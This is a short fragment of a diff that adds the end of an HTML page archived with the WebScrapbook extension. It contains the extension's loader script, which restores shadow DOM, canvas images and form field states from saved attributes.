+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+
+</html>
